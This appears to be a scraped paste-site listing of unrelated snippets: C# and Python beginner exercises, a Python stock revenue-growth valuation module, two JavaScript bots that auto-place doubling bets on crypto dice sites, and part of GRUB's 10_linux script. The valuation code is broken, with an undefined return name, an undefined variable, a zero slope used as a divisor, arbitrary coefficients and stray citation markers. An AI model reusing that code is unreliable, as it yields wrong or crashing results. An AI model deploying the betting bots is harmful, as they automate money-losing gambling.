    stars = 2 * n - 2;

    for (let row = 0; row < 2; row++) {
        output += '*'.repeat(stars) + ' '.repeat(spaces) + ""\n"";
        spaces += 2;
        stars -= 2;
    }

    spaces = 2;
    stars = 2 * n - 2;

    for (let row = 0; row < 2; row++) {
        output += '*'.repeat(stars) + ' '.repeat(spaces) + ""\n"";
        if (spaces > 0 && stars > 0) {
            spaces -= 2;
            stars += 2;
        }
    }

    spaces = 2;
    stars = 2 * n - 2;

    for (let row = 0; row < 2; row++) {
        output += ' '.repeat(spaces) + '*'.repeat(stars) + ""\n"";
        spaces += 2;
        stars -= 2;
    }

    spaces = 2;
    stars = 2 * n - 2;

    for (let row = 0; row < 2; row++) {
        output += ' '.repeat(spaces) + '*'.repeat(stars) + ""\n"";
        if (spaces > 0 && stars > 0) {
            spaces -= 2;
            stars += 2;
        }
    }

    spaces = 2;
    stars = 2 * n - 2;

    for (let row = 0; row < n; row++) {
        output += '*'.repeat(stars) + ' '.repeat(spaces) + ""\n"";
        spaces += 2;
        stars -= 2;
    }

    console.log(output);
}"
GWtw7T4a,Untitled,samipote,Python,Sunday 24th of September 2023 09:56:05 AM CDT,"def get_single_ticker_revenue_growth_rate(ticker):
    # Get the total revenue for the TTM
    ttm_revenue = get_ttm_total_revenue(ticker)
    if not ttm_revenue:
        return None # No revenue data available
    # Get the total revenue for the previous year
    stock = yf.Ticker(ticker)
    income_statement = stock.financials
    previous_year_revenue = float(income_statement.loc[""Total Revenue""].iloc[1])
    if not previous_year_revenue:
        return None # No revenue data available
    # Calculate the revenue growth rate as the percentage change from previous year to TTM
    revenue_growth_rate = (ttm_revenue - previous_year_revenue) / previous_year_revenue
    return revenue_growth_rate

def get_revenue_growth_rate_cycle1_begin(ticker, comparable_tickers):
    """"""Compute the revenue growth rate for cycle 1 begin for a given ticker using yfinance.""""""
    # Get the total revenue for the TTM
    ttm_revenue = get_ttm_total_revenue(ticker)
    if not ttm_revenue:
        return None # No revenue data available[^3^][3]
    # Get the total revenue for the previous year
    stock = yf.Ticker(ticker)
    income_statement = stock.financials
    previous_year_revenue = float(income_statement.loc[""Total Revenue""].iloc[1])
    if not previous_year_revenue:
        return None # No revenue data available
    # Calculate the revenue growth rate as the percentage change from previous year to TTM
    revenue_growth_rate = (ttm_revenue - previous_year_revenue) / previous_year_revenue
    # Get the revenue growth rates for each comparable ticker
    revenue_growth_rates = [get_single_ticker_revenue_growth_rate(ticker) for ticker in comparable_tickers]
    revenue_growth_rates = [rate for rate in revenue_growth_rates if rate is not None] # Remove None values[^2^][2]
    # Calculate the industry average revenue growth rate
    industry_average_revenue_growth_rate = sum(revenue_growth_rates) / len(revenue_growth_rates)
    # Estimate the revenue growth rate for cycle 1 begin using a weighted average
    omega = 0.5 # Weight given to the company's current revenue growth rate
    revenue_growth_rate_cycle1_begin = omega * revenue_growth_rate + (1 - omega) * industry_average_revenue_growth_rate
    return revenue_growth_rate_cycle1_begin

def get_revenue_growth_rate_cycle1_end(ticker, comparable_tickers):
    """"""Compute the revenue growth rate for cycle 1 end for a given ticker using yfinance.""""""
    # Get the total revenue for the TTM
    ttm_revenue = get_ttm_total_revenue(ticker)
    if not ttm_revenue:
        return None # No revenue data available
    # Get the total revenue for the previous year
    stock = yf.Ticker(ticker)
    income_statement = stock.financials
    previous_year_revenue = float(income_statement.loc[""Total Revenue""].iloc[1])
    if not previous_year_revenue:
        return None # No revenue data available
    # Calculate the revenue growth rate as the percentage change from previous year to TTM
    revenue_growth_rate = (ttm_revenue - previous_year_revenue) / previous_year_revenue
    # Get the revenue growth rates for each comparable ticker
    revenue_growth_rates = [get_single_ticker_revenue_growth_rate(ticker) for ticker in comparable_tickers]
    revenue_growth_rates = [rate for rate in revenue_growth_rates if rate is not None] # Remove None values
    # Calculate the industry average revenue growth rate
    industry_average_revenue_growth_rate = sum(revenue_growth_rates) / len(revenue_growth_rates)
    # Estimate the revenue growth rate for cycle 2 begin using a weighted average
    omega = 0.5 # Weight given to the company's current revenue growth rate
    revenue_growth_rate_cycle2_begin = omega * revenue_growth_rate + (1 - omega) * industry_average_revenue_growth_rate
    # Assume a linear convergence from cycle 1 begin to cycle 2 begin growth rates
    # Use the equation y = mx + b, where y is the growth rate, x is the year, m is the slope, and b is the intercept
    # Solve for y when x equals 1 (the end of cycle 1)
    slope = (revenue_growth_rate_cycle2_begin - revenue_growth_rate_cycle1_begin) / DURATION # DURATION is the number of years for valuation
    intercept = revenue_growth_rate_cycle1_begin
    revenue_growth_rate_cycle1_end = slope * 1 + intercept
    return revenue_growth_rate_cycle1_end



def get_length_of_cycle1(ticker, comparable_tickers):
    """"""Compute the length of cycle 1 for a given ticker using yfinance.""""""
    # Get the revenue growth rate for cycle 1 begin
    revenue_growth_rate_cycle1_begin = get_revenue_growth_rate_cycle1_begin(ticker, comparable_tickers)
    if not revenue_growth_rate_cycle1_begin:
        return None # No revenue data available
    
    # Get the revenue growth rates for each comparable ticker
    revenue_growth_rates = [get_single_ticker_revenue_growth_rate(ticker) for ticker in comparable_tickers]
    revenue_growth_rates = [rate for rate in revenue_growth_rates if rate is not None] # Remove None values
    
    # Calculate the industry average revenue growth rate
    industry_average_revenue_growth_rate = sum(revenue_growth_rates) / len(revenue_growth_rates)
    
    # Estimate the revenue growth rate for cycle 2 begin using a weighted average
    omega = 0.5 # Weight given to the company's current revenue growth rate
    revenue_growth_rate_cycle2_begin = omega * revenue_growth_rate_cycle1_begin + (1 - omega) * industry_average_revenue_growth_rate
    
    # Assume a linear convergence from cycle 1 begin to cycle 2 begin growth rates
    # Use the equation y = mx + b, where y is the growth rate, x is the year, m is the slope, and b is the intercept
    # Solve for x when y equals the industry average growth rate
    slope = (revenue_growth_rate_cycle2_begin - revenue_growth_rate_cycle1_begin) / DURATION # DURATION is the number of years for valuation
    intercept = revenue_growth_rate_cycle1_begin
    length_of_cycle1 = (industry_average_revenue_growth_rate - intercept) / slope
    
    return length_of_cycle1


def get_revenue_growth_rate_cycle2_begin(ticker, comparable_tickers):
    """"""Compute the revenue growth rate for cycle 2 begin for a given ticker using yfinance.""""""
    # Get the revenue growth rate for cycle 1 begin
    revenue_growth_rate_cycle1_begin = get_revenue_growth_rate_cycle1_begin(ticker, comparable_tickers)
    if not revenue_growth_rate_cycle1_begin:
        return None # No revenue data available[^1^][1]
    
    # Get the revenue growth rates for each comparable ticker
    revenue_growth_rates = [get_single_ticker_revenue_growth_rate(ticker) for ticker in comparable_tickers]
    revenue_growth_rates = [rate for rate in revenue_growth_rates if rate is not None] # Remove None values
    
    # Calculate the industry average revenue growth rate
    industry_average_revenue_growth_rate = sum(revenue_growth_rates) / len(revenue_growth_rates)
    
    # Estimate the revenue growth rate for cycle 2 begin using a weighted average
    omega = 0.5 # Weight given to the company's current revenue growth rate
    revenue_growth_rate_cycle2_begin = omega * revenue_growth_rate_cycle1_begin + (1 - omega) * industry_average_revenue_growth_rate
    
    return revenue_growth_rate_cycle2_begin

def get_revenue_growth_rate_cycle2_end(ticker):
    """"""Compute the revenue growth rate for cycle 2 end for a given ticker using yfinance.""""""
    
    # Get the total revenue for the TTM[^1^][1]
    ttm_revenue = get_ttm_total_revenue(ticker)
    if not ttm_revenue:
        return None # No revenue data available[^1^][1]
    
    # Get the market capitalization of the company
    stock = yf.Ticker(ticker)
    market_cap = stock.info['marketCap'] / 10**9 # Convert to billions
    
    # Calculate the price-to-sales ratio as the ratio of market cap to TTM revenue
    price_to_sales_ratio = market_cap / ttm_revenue
    
    # Assume a linear relationship between the price-to-sales ratio and the revenue growth rate
    # Use the equation y = mx + b, where y is the price-to-sales ratio, x is the revenue growth rate, m is the slope, and b is the intercept
    # Use some arbitrary values for the slope and intercept based on historical data
    slope = -0.5
    intercept = 0.2
    
    # Solve for x when y equals the current price-to-sales ratio
    revenue_growth_rate_cycle2_end = (price_to_sales_ratio - intercept) / slope
    
    return revenue_growth_rate_cycle2_end

def get_length_of_cycle2(ticker, comparable_tickers):
    """"""Compute the length of cycle 2 for a given ticker using yfinance.""""""
    # Get the revenue growth rate for cycle 2 begin
    revenue_growth_rate_cycle2_begin = get_revenue_growth_rate_cycle2_begin(ticker, comparable_tickers)
    if not revenue_growth_rate_cycle2_begin:
        return None # No revenue data available
    
    # Get the revenue growth rate for cycle 2 end
    revenue_growth_rate_cycle2_end = get_revenue_growth_rate_cycle2_end(ticker)
    if not revenue_growth_rate_cycle2_end:
        return None # No revenue data available
    
    # Get the revenue growth rates for each comparable ticker
    revenue_growth_rates = [get_single_ticker_revenue_growth_rate(ticker) for ticker in comparable_tickers]
    revenue_growth_rates = [rate for rate in revenue_growth_rates if rate is not None] # Remove None values
    
    # Calculate the industry average revenue growth rate
    industry_average_revenue_growth_rate = sum(revenue_growth_rates) / len(revenue_growth_rates)
    
    # Estimate the revenue growth rate for cycle 3 begin using a weighted average
    omega = 0.5 # Weight given to the company's current revenue growth rate
    revenue_growth_rate_cycle3_begin = omega * revenue_growth_rate_cycle2_end + (1 - omega) * industry_average_revenue_growth_rate
    
    # Assume a linear convergence from cycle 2 begin to cycle 3 begin growth rates
    # Use the equation y = mx + b, where y is the growth rate, x is the year, m is the slope, and b is the intercept
    # Solve for x when y equals the industry average growth rate
    slope = (revenue_growth_rate_cycle3_begin - revenue_growth_rate_cycle2_begin) / DURATION # DURATION is the number of years for valuation
    intercept = revenue_growth_rate_cycle2_begin
    length_of_cycle2 = (industry_average_revenue_growth_rate - intercept) / slope
    
    return length_of_cycle2


def get_revenue_growth_rate_cycle3_begin(ticker, comparable_tickers):
    """"""Compute the revenue growth rate for cycle 3 begin for a given ticker using yfinance.""""""
    
    # Get the revenue growth rate for cycle 2 end
    revenue_growth_rate_cycle2_end = get_revenue_growth_rate_cycle2_end(ticker)
    if not revenue_growth_rate_cycle2_end:
        return None # No revenue data available[^1^][1]
    
    # Get the revenue growth rates for each comparable ticker
    revenue_growth_rates = [get_single_ticker_revenue_growth_rate(ticker) for ticker in comparable_tickers]
    revenue_growth_rates = [rate for rate in revenue_growth_rates if rate is not None] # Remove None values
    
    # Calculate the industry average revenue growth rate
    industry_average_revenue_growth_rate = sum(revenue_growth_rates) / len(revenue_growth_rates)
    
    # Estimate the revenue growth rate for cycle 3 begin using a weighted average
    omega = 0.5 # Weight given to the company's current revenue growth rate
    revenue_growth_rate_cycle3_begin = omega * revenue_growth_rate_cycle2_end + (1 - omega) * industry_average_revenue_growth_rate
    
    return revenue_growth_rate_cycle3_begin

def get_revenue_growth_rate_cycle3_end(ticker):
    """"""Compute the revenue growth rate for cycle 2 end for a given ticker using yfinance.""""""
    
    # Get the total revenue for the TTM[^1^][1]
    ttm_revenue = get_ttm_total_revenue(ticker)
    if not ttm_revenue:
        return None # No revenue data available[^1^][1]
    
    # Get the market capitalization of the company
    stock = yf.Ticker(ticker)
    market_cap = stock.info['marketCap'] / 10**9 # Convert to billions
    
    # Calculate the price-to-sales ratio as the ratio of market cap to TTM revenue
    price_to_sales_ratio = market_cap / ttm_revenue
    
    # Assume a linear relationship between the price-to-sales ratio and the revenue growth rate
    # Use the equation y = mx + b, where y is the price-to-sales ratio, x is the revenue growth rate, m is the slope, and b is the intercept
    # Use some arbitrary values for the slope and intercept based on historical data
    slope = -0.5
    intercept = 0.2
    
    # Solve for x when y equals the current price-to-sales ratio
    revenue_growth_rate_cycle3_end = (price_to_sales_ratio - intercept) / slope
    
    return revenue_growth_rate_cycle3_en


def get_length_of_cycle3(ticker, comparable_tickers):
    """"""Compute the length of cycle 2 for a given ticker using yfinance.""""""
    # Get the revenue growth rate for cycle 2 begin
    revenue_growth_rate_cycle3_begin = get_revenue_growth_rate_cycle3_begin(ticker, comparable_tickers)
    if not revenue_growth_rate_cycle3_begin:
        return None # No revenue data available
    
    # Get the revenue growth rate for cycle 2 end
    revenue_growth_rate_cycle3_end = get_revenue_growth_rate_cycle3_end(ticker)
    if not revenue_growth_rate_cycle3_end:
        return None # No revenue data available
    
    # Get the revenue growth rates for each comparable ticker
    revenue_growth_rates = [get_single_ticker_revenue_growth_rate(ticker) for ticker in comparable_tickers]
    revenue_growth_rates = [rate for rate in revenue_growth_rates if rate is not None] # Remove None values
    
    # Calculate the industry average revenue growth rate
    industry_average_revenue_growth_rate = sum(revenue_growth_rates) / len(revenue_growth_rates)
    
    # Estimate the revenue growth rate for cycle 3 begin using a weighted average
    omega = 0.5 # Weight given to the company's current revenue growth rate
    revenue_growth_rate_cycle3_begin = omega * revenue_growth_rate_cycle3_end + (1 - omega) * industry_average_revenue_growth_rate
    
    # Assume a linear convergence from cycle 2 begin to cycle 3 begin growth rates
    # Use the equation y = mx + b, where y is the growth rate, x is the year, m is the slope, and b is the intercept
    # Solve for x when y equals the industry average growth rate
    slope = (revenue_growth_rate_cycle3_begin - revenue_growth_rate_cycle3_begin) / DURATION # DURATION is the number of years for valuation
    intercept = revenue_growth_rate_cycle3_begin
    length_of_cycle3 = (industry_average_revenue_growth_rate - intercept) / slope
    
    return length_of_cycle3"
uF0FY2bi,Магазин кристаллов,Yaniha,C#,Sunday 24th of September 2023 09:52:29 AM CDT,"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using static System.Net.Mime.MediaTypeNames;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int moneyInTheBag;
            int crystalPrice = 10;
            int countTheCrystalsToBuy;

            Console.WriteLine($""Добро пожаловать в магазин кристаллов. Цена за штуку: {crystalPrice} монет."");
            Console.Write(""Сколько у вас монет? "");
            moneyInTheBag = Convert.ToInt32(Console.ReadLine());
            Console.Write(""Сколько кристаллов вы хотите купить? "");
            countTheCrystalsToBuy = Convert.ToInt32(Console.ReadLine());
            moneyInTheBag -= countTheCrystalsToBuy * crystalPrice;
            Console.WriteLine($""Поздравляем! Теперь вы имеете {moneyInTheBag} монет и {countTheCrystalsToBuy} кристаллов"");

            Console.ReadKey();
        }
    }
}"
SM3TkXUk,Перестановка местами значений,Yaniha,C#,Sunday 24th of September 2023 09:35:43 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using static System.Net.Mime.MediaTypeNames;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string name = ""Татаринов"";
            string surname = ""Егор"";
            string emptyString;

            Console.WriteLine($""До перестановки"");
            Console.WriteLine($""Имя: {name}; Фамилия: {surname}"");
            emptyString = name;
            name = surname;
            surname = emptyString;
            Console.WriteLine($""После перестановки"");
            Console.WriteLine($""Имя: {name}; Фамилия: {surname}"");

            Console.ReadKey();
        }
    }
}"
1nCs68QC,freedoge,coinwalk,JavaScript,Sunday 24th of September 2023 09:18:33 AM CDT,"var measly = parseFloat(document.getElementById('cryptovalue').innerHTML);
var div = 100;
var mild = (div/40);
var baby = Number((measly/div).toFixed(8));
var moon = baby;
var taget = 20000;
var tens = (baby*10);
var sevens = (baby*7);
var baboon = false;
var upper = 6.9;
var downer = 2.9;
var zoom = ((Math.floor(measly/tens))*tens);
var zoomer = ((Math.floor(measly/tens))*tens);
var olzerer = ((Math.floor(measly/tens))*tens);
var mith = 2;
var bill = true;
var brother = measly;
var boon = 0;
var zuel = parseFloat(document.getElementById('cryptovalue').innerHTML);




function get(){
zuel = parseFloat(document.getElementById('cryptovalue').innerHTML);
if ((zuel>(zoom+(moon*upper)))&&(zuel>=olzerer)) {
    moon = moon*2;
    upper = 4.9;
    downer = 4.9;
    mith = 2;
    zoom = parseFloat(zuel);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>(zoom+(moon*upper)))&&(zuel<olzerer)) {
    moon = moon*2;
    upper = 4.9;
    downer = 4.9;
    zoom = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(bill)) {
    moon = moon*2;
    upper = 4.9;
    downer = 1.9;
    mith = 0;
    bill = false; 
   zoom = parseFloat(zuel);
    zoomer = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(!bill)&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))){
    moon = baby;
    upper = 6.9;
    downer = 2.9;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>=(olzerer+(tens*mith)))&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))){
    moon = baby;
    upper = 6.9;
    downer = 2.9;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((moon>(measly/mild))&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))){
    moon = baby;
    upper = 6.9;
    downer = 2.9;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
    if (zuel >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }    
if ((zuel!=brother)&&(boon>=1)){
brother = parseFloat(zuel);
boon = 0;
}
if ((zuel==brother)&&(boon<=0)){   
document.getElementsByClassName('form-control').winchance.value = 50;
(document.getElementById('cryptomultiply').value = ((moon*1).toFixed(8)));
reclc();
multiply(0);
boon = 1;
}
setTimeout(() => get(), 1);
}
get();

"
VqyHsQmt,++ snowybot update,coinwalk,JavaScript,Sunday 24th of September 2023 09:18:03 AM CDT,"var measly = parseFloat(document.getElementById('pct_balance').value);
var div = 800;
var mild = (div/40);
var baby = Number((measly/div).toFixed(8));
var moon = baby;
var taget = 200000;
var tens = (baby*10);
var sevens = (baby*7);
var baboon = false;
var upper = 6.9;
var downer = 2.9;
var zoom = ((Math.floor(measly/tens))*tens);
var zoomer = ((Math.floor(measly/tens))*tens);
var olzerer = ((Math.floor(measly/tens))*tens);
var mith = 2;
var bill = true;
var zuel = parseFloat(document.getElementById('pct_balance').value);

 
function get(){
zuel = parseFloat(document.getElementById('pct_balance').value);
if ((zuel>(zoom+(moon*upper)))&&(zuel>=olzerer)) {
    moon = moon*2;
    upper = 4.9;
    downer = 4.9;
    mith = 2;
    zoom = parseFloat(zuel);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>(zoom+(moon*upper)))&&(zuel<olzerer)) {
    moon = moon*2;
    upper = 4.9;
    downer = 4.9;
    zoom = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(bill)) {
    moon = moon*2;
    upper = 4.9;
    downer = 1.9;
    mith = 0;
    bill = false; 
   zoom = parseFloat(zuel);
    zoomer = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(!bill)&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))){
    moon = baby;
    upper = 6.9;
    downer = 2.9;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>=(olzerer+(tens*mith)))&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))){
    moon = baby;
    upper = 6.9;
    downer = 2.9;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((moon>(measly/mild))&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))){
    moon = baby;
    upper = 6.9;
    downer = 2.9;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
    if (zuel >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }    
var funeral = (zuel - measly).toFixed(8);
console.log(""profit"");
console.log(funeral); 
        $('#pct_chance').val(49.5);
        $('#pct_bet').val(((moon*1).toFixed(8)));
        $('#a_lo').click();
    setTimeout(() => get(), 1);
}
get();"
FpEe0GkF,Sublime Logo,Spocoman,C#,Sunday 24th of September 2023 09:13:54 AM CDT,"using System;

namespace SublimeLogo
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int n = int.Parse(Console.ReadLine());

            int spaces = 2 * n - 2;
            int stars = 2;

            for (int row = 0; row < n; row++)
            {
                Console.Write(new string(' ', spaces));
                Console.Write(new string('*', stars));
                spaces -= 2;
                stars += 2;
                Console.WriteLine();
            }

            spaces = 2;
            stars = 2 * n - 2;

            for (int row = 0; row < 2; row++)
            {
                Console.Write(new string('*', stars));
                Console.Write(new string(' ', spaces));
                spaces += 2;
                stars -= 2;
                Console.WriteLine();
            }

            spaces = 2;
            stars = 2 * n - 2;

            for (int row = 0; row < 2; row++)
            {
                Console.Write(new string('*', stars));
                Console.Write(new string(' ', spaces));
                if (spaces > 0 && stars > 0)
                {
                    spaces -= 2;
                    stars += 2;
                }
                Console.WriteLine();
            }

            spaces = 2;
            stars = 2 * n - 2;

            for (int row = 0; row < 2; row++)
            {
                Console.Write(new string(' ', spaces));
                Console.Write(new string('*', stars));
                spaces += 2;
                stars -= 2;
                Console.WriteLine();
            }

            spaces = 2;
            stars = 2 * n - 2;

            for (int row = 0; row < 2; row++)
            {
                Console.Write(new string(' ', spaces));
                Console.Write(new string('*', stars));
                if (spaces > 0 && stars > 0)
                {
                    spaces -= 2;
                    stars += 2;
                }
                Console.WriteLine();
            }

            spaces = 2;
            stars = 2 * n - 2;

            for (int row = 0; row < n; row++)
            {
                Console.Write(new string('*', stars));
                Console.Write(new string(' ', spaces));
                spaces += 2;
                stars -= 2;
                Console.WriteLine();
            }
        }
    }
}"
EmM3s96u,Running In The Park,Spocoman,Python,Sunday 24th of September 2023 09:10:50 AM CDT,"total_minutes = 0
total_distance = 0
total_calories = 0

n = int(input())

for i in range(n):
    day_minutes = int(input())
    day_distance = float(input())
    distance_unit = input()
    if distance_unit == ""m"":
        day_distance *= 0.001

    total_minutes += day_minutes
    total_distance += day_distance
    total_calories += int(day_minutes * 400 / 20)

print(f""He ran {total_distance:.2f}km for {total_minutes} minutes and burned {total_calories} calories."")
"
b44LUvpz,Modified-10_linux,chrisretusn,Bash,Sunday 24th of September 2023 09:05:57 AM CDT,"#! /bin/sh
set -e

# grub-mkconfig helper script.
# Copyright (C) 2006,2007,2008,2009,2010  Free Software Foundation, Inc.
#
# GRUB is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# GRUB is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with GRUB.  If not, see <http://www.gnu.org/licenses/>.

prefix=""/usr""
exec_prefix=""/usr""
datarootdir=""/usr/share""

. ""$pkgdatadir/grub-mkconfig_lib""

export TEXTDOMAIN=grub
export TEXTDOMAINDIR=""${datarootdir}/locale""

CLASS=""--class gnu-linux --class gnu --class os""

if [ ""x${GRUB_DISTRIBUTOR}"" = ""x"" ] ; then
  OS=GNU/Linux
else
  OS=""${GRUB_DISTRIBUTOR}""
  CLASS=""--class $(echo ${GRUB_DISTRIBUTOR} | tr 'A-Z' 'a-z' | cut -d' ' -f1|LC_ALL=C sed 's,[^[:alnum:]_],_,g') ${CLASS}""
fi

# loop-AES arranges things so that /dev/loop/X can be our root device, but
# the initrds that Linux uses don't like that.
case ${GRUB_DEVICE} in
  /dev/loop/*|/dev/loop[0-9])
    GRUB_DEVICE=`losetup ${GRUB_DEVICE} | sed -e ""s/^[^(]*(\([^)]\+\)).*/\1/""`
  ;;
esac

# Default to disabling partition uuid support to maintian compatibility with
# older kernels.
GRUB_DISABLE_LINUX_PARTUUID=${GRUB_DISABLE_LINUX_PARTUUID-true}

# btrfs may reside on multiple devices. We cannot pass them as value of root= parameter
# and mounting btrfs requires user space scanning, so force UUID in this case.
if ( [ ""x${GRUB_DEVICE_UUID}"" = ""x"" ] && [ ""x${GRUB_DEVICE_PARTUUID}"" = ""x"" ] ) \
    || ( [ ""x${GRUB_DISABLE_LINUX_UUID}"" = ""xtrue"" ] \
	&& [ ""x${GRUB_DISABLE_LINUX_PARTUUID}"" = ""xtrue"" ] ) \
    || ( ! test -e ""/dev/disk/by-uuid/${GRUB_DEVICE_UUID}"" \
	&& ! test -e ""/dev/disk/by-partuuid/${GRUB_DEVICE_PARTUUID}"" ) \
    || ( test -e ""${GRUB_DEVICE}"" && uses_abstraction ""${GRUB_DEVICE}"" lvm ); then
  LINUX_ROOT_DEVICE=${GRUB_DEVICE}
elif [ ""x${GRUB_DEVICE_UUID}"" = ""x"" ] \
    || [ ""x${GRUB_DISABLE_LINUX_UUID}"" = ""xtrue"" ]; then
  LINUX_ROOT_DEVICE=PARTUUID=${GRUB_DEVICE_PARTUUID}
else
  LINUX_ROOT_DEVICE=UUID=${GRUB_DEVICE_UUID}
fi

case x""$GRUB_FS"" in
    xbtrfs)
	rootsubvol=""`make_system_path_relative_to_its_root /`""
	rootsubvol=""${rootsubvol#/}""
	if [ ""x${rootsubvol}"" != x ]; then
	    GRUB_CMDLINE_LINUX=""rootflags=subvol=${rootsubvol} ${GRUB_CMDLINE_LINUX}""
	fi;;
    xzfs)
	rpool=`${grub_probe} --device ${GRUB_DEVICE} --target=fs_label 2>/dev/null || true`
	bootfs=""`make_system_path_relative_to_its_root / | sed -e ""s,@$,,""`""
	LINUX_ROOT_DEVICE=""ZFS=${rpool}${bootfs%/}""
	;;
esac

title_correction_code=

linux_entry ()
{
  os=""$1""
  version=""$2""
  type=""$3""
  args=""$4""

  if [ -z ""$boot_device_id"" ]; then
      boot_device_id=""$(grub_get_device_id ""${GRUB_DEVICE}"")""
  fi
  if [ x$type != xsimple ] ; then
      niceflavor=
      if [ ""x${flavor}"" != x ]; then
         niceflavor=""${flavor^}""
      fi

      niceversion=
      if [ ""x$version"" != x ]; then
         niceversion=""[${version^}]""
         if [ ""x$version"" = xvmlinuz ]; then
            niceversion=""""
         fi
      fi

      real_niceversion=
      if [ ""x$real_version"" != x ]; then
          real_niceversion=""(${real_version})""
      fi

      case $type in
	  recovery)
	      title=""$(gettext_printf ""%s, with Linux %s (recovery mode)"" ""${os}"" ""${version}"")"" ;;
	  *)
	      title=$(gettext_printf ""%s with %s Kernel %s %s"" ""${os}"" ""${niceflavor}"" ""${niceversion}"" ""${real_niceversion}"") ;;
      esac
      if [ x""$title"" = x""$GRUB_ACTUAL_DEFAULT"" ] || [ x""Previous Linux versions>$title"" = x""$GRUB_ACTUAL_DEFAULT"" ]; then
	  replacement_title=""$(echo ""Advanced options for ${OS}"" | sed 's,>,>>,g')>$(echo ""$title"" | sed 's,>,>>,g')""
	  quoted=""$(echo ""$GRUB_ACTUAL_DEFAULT"" | grub_quote)""
	  title_correction_code=""${title_correction_code}if [ \""x\$default\"" = '$quoted' ]; then default='$(echo ""$replacement_title"" | grub_quote)'; fi;""
	  grub_warn ""$(gettext_printf ""Please don't use old title \`%s' for GRUB_DEFAULT, use \`%s' (for versions before 2.00) or \`%s' (for 2.00 or later)"" ""$GRUB_ACTUAL_DEFAULT"" ""$replacement_title"" ""gnulinux-advanced-$boot_device_id>gnulinux-$version-$type-$boot_device_id"")""
      fi
      echo ""menuentry '$(echo ""$title"" | grub_quote)' ${CLASS} \$menuentry_id_option 'gnulinux-$version-$type-$flavor-$boot_device_id' {"" | sed ""s/^/$submenu_indentation/""
  else
      echo ""menuentry '$(echo ""$os"" | grub_quote)' ${CLASS} \$menuentry_id_option 'gnulinux-simple-$boot_device_id' {"" | sed ""s/^/$submenu_indentation/""
  fi
  if [ x$type != xrecovery ] ; then
      save_default_entry | grub_add_tab
  fi

  # Use ELILO's generic ""efifb"" when it's known to be available.
  # FIXME: We need an interface to select vesafb in case efifb can't be used.
  if [ ""x$GRUB_GFXPAYLOAD_LINUX"" = x ]; then
      echo ""	load_video"" | sed ""s/^/$submenu_indentation/""
      if grep -qx ""CONFIG_FB_EFI=y"" ""${config}"" 2> /dev/null \
	  && grep -qx ""CONFIG_VT_HW_CONSOLE_BINDING=y"" ""${config}"" 2> /dev/null; then
	  echo ""	set gfxpayload=keep"" | sed ""s/^/$submenu_indentation/""
      fi
  else
      if [ ""x$GRUB_GFXPAYLOAD_LINUX"" != xtext ]; then
	  echo ""	load_video"" | sed ""s/^/$submenu_indentation/""
      fi
      echo ""	set gfxpayload=$GRUB_GFXPAYLOAD_LINUX"" | sed ""s/^/$submenu_indentation/""
  fi

  echo ""	insmod gzio"" | sed ""s/^/$submenu_indentation/""

  if [ x$dirname = x/ ]; then
    if [ -z ""${prepare_root_cache}"" ]; then
      prepare_root_cache=""$(prepare_grub_to_access_device ${GRUB_DEVICE} | grub_add_tab)""
    fi
    printf '%s\n' ""${prepare_root_cache}"" | sed ""s/^/$submenu_indentation/""
  else
    if [ -z ""${prepare_boot_cache}"" ]; then
      prepare_boot_cache=""$(prepare_grub_to_access_device ${GRUB_DEVICE_BOOT} | grub_add_tab)""
    fi
    printf '%s\n' ""${prepare_boot_cache}"" | sed ""s/^/$submenu_indentation/""
  fi
  message=""$(gettext_printf ""Loading Linux %s ..."" ${version})""
  sed ""s/^/$submenu_indentation/"" << EOF
